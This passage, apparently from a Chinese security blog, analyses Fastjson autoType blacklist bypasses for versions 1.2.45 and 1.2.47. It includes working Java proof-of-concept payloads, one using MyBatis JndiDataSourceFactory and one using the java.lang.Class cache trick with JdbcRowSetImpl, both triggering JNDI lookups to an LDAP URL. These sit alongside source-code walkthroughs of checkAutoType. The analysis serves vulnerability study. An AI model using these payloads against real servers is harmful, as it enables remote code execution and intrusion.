</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9198507b5af98f0L</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9195c07b5af5345L</span><span class="o">)</span><span class="c1">//针对双写L和;的情况做出限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 9195c07b5af5345
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">className</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span><span class="c1">//黑白名单校验
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">JavaBeanInfo</span> <span class="n">beanInfo</span> <span class="o">=</span> <span class="n">JavaBeanInfo</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">propertyNamingStrategy</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">ClassLoader</span> <span class="n">classLoader</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">cache</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">)</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">componentType</span> <span class="o">=</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="n">classLoader</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">componentType</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">getClass</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于添加了<code>[</code>导致需要进行特殊处理,在<code>&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</code>后面添加<code>[{</code>即可</p>
<h2 id="1245">1.2.45</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">1.2.45版本对[的绕过进行了修复,但是黑名单不完善可以利用mybatis进行绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">需要目标服务端存在mybatis的jar包,且需为3.x&lt;3.5.0的版本
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_45</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&#34;,\&#34;properties\&#34;:{\&#34;data_source\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png, https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png 1.5x, https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png"
        title="https://img.mi3aka.eu.org/2023/02/edf381d5b0fa5fe29eb0926ee9667587.png" /></p>
<h3 id="checkautotype分析-3">checkAutoType分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">h1</span> <span class="o">==</span> <span class="mh">0xaf64164c86024f1aL</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// 对[开头进行检测
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mybatis分析">mybatis分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setProperties</span><span class="o">(</span><span class="n">Properties</span> <span class="n">properties</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">InitialContext</span> <span class="n">initCtx</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">Properties</span> <span class="n">env</span> <span class="o">=</span> <span class="n">getEnvProperties</span><span class="o">(</span><span class="n">properties</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">env</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">properties</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">INITIAL_CONTEXT</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">properties</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">DATA_SOURCE</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">properties</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">DATA_SOURCE</span><span class="o">))</span> <span class="o">{</span><span class="c1">//data_source为ldap地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">dataSource</span> <span class="o">=</span> <span class="o">(</span><span class="n">DataSource</span><span class="o">)</span> <span class="n">initCtx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">properties</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="n">DATA_SOURCE</span><span class="o">));</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png, https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png 1.5x, https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png"
        title="https://img.mi3aka.eu.org/2023/02/df6986b1d0a1f767b6a4fdb0d7011968.png" /></p>
<h2 id="1247">1.2.47</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">Fastjson从1.2.25开始,添加了配置项setAutoTypeSupport以及白名单,进一步限制@type的使用,默认该配置项关闭
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">如果配置项是关闭状态,那么只允许白名单内的类才能通过@type指定,但是存在绕过方式,且不需要setAutoTypeSupport为true
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">如果先传入如下JSON进行反序列化
</span></span></span><span class="line"><span class="cl"><span class="cm">{
</span></span></span><span class="line"><span class="cl"><span class="cm">    &#34;@type&#34;: &#34;java.lang.Class&#34;,
</span></span></span><span class="line"><span class="cl"><span class="cm">    &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">}
</span></span></span><span class="line"><span class="cl"><span class="cm">java.lang.Class是在白名单中的,反序列化后com.sun.rowset.JdbcRowSetImpl就会被加入到白名单中,剩下的就和1.2.24相同了
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_47</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;a\&#34;: {\&#34;@type\&#34;: \&#34;java.lang.Class\&#34;,\&#34;val\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;b\&#34;: {\&#34;@type\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;: \&#34;ldap://127.0.0.1:1389/exp\&#34;,\&#34;autoCommit\&#34;: true}}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png, https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png 1.5x, https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png"
        title="https://img.mi3aka.eu.org/2023/02/af7037eac7a0102a11c61aed0d9293d2.png" /></p>
<h3 id="未开启autotypesupport">未开启AutoTypeSupport</h3>
<ol>
<li>初始化</li>
</ol>
<p>在<code>com.alibaba.fastjson.parser.ParserConfig.initDeserializers</code>中,会向<code>deserializers</code>中添加<code>(Class.class, MiscCodec.instance)</code>作为缓存,在后续的<code>deserializer.deserialze(this, clazz, fieldName)</code>根据<code>clazz</code>的内容调用相应的的<code>deserializer</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png, https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png 1.5x, https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png"
        title="https://img.mi3aka.eu.org/2023/02/7077c2a0e032f21d9f665ea27d314c73.png" /></p>
<ol start="2">
<li>第一次checkAutoType</li>
</ol>
<p>此时的<code>typename</code>为<code>java.lang.Class</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png, https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png 1.5x, https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png"
        title="https://img.mi3aka.eu.org/2023/02/35abe4fc2d1ba9b24f965e909f2b90bf.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">deserializers</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//clazz为class java.lang.Class
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>加载<code>deserializer</code></li>
</ol>
<p>通过<code>config.getDeserializer(clazz)</code>获取<code>deserializer</code>,当前类为<code>java.lang.Class</code>即<code>Class.class</code>对应的<code>deserializer</code>为<code>MiscCodec</code></p>
<p>接下来通过<code>deserializer.deserialze(this, clazz, fieldName)</code>进行<code>deserialze</code>操作</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png, https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png 1.5x, https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png"
        title="https://img.mi3aka.eu.org/2023/02/1f2b744c03a5eb25b6a584c78ae49267.png" /></p>
<ol start="4">
<li>进行<code>deserialze</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.serializer.MiscCodec
